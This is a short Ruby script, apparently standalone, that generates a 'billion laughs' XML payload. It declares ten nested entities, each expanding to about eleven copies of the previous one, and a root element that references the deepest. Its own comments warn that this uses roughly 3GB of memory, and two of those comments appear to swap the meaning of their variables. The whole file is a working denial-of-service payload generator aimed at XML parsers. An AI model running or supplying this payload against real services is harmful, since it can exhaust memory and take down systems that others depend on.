
# how many iterations will be printed
# note: 10 already results in roughly 3GB usage!
@maxents = 10

# how many entities per element will be printed
@iterations = 10

# the name of the entity
@entname = "lol"

# the contents of the entity
@entcontent = @entname

# name of the element
# note: must NOT be the same as the entity name
@elemname = "lolz"

####
#### don't touch anything below, unless you know
#### what you're doing!
####
curlevel = 0

puts %q(<?xml version="1.0" ?>)
puts %Q(<!DOCTYPE #@elemname [)
puts %Q( <!ENTITY #@entname "#@entname">)
puts %Q( <!ELEMENT #@elemname (#PCDATA)>)
(1 .. @maxents).each do |max|
  print %Q(<!ENTITY #@entname#{max} ")
  name = "&#@entname#{curlevel > 0 ? curlevel : ""};"
  (0 .. @iterations).each do
    print name
  end
  puts "\">"
  curlevel += 1
end
puts ']>'
puts %Q(<#@elemname>&lol#@maxents;</#@elemname>)
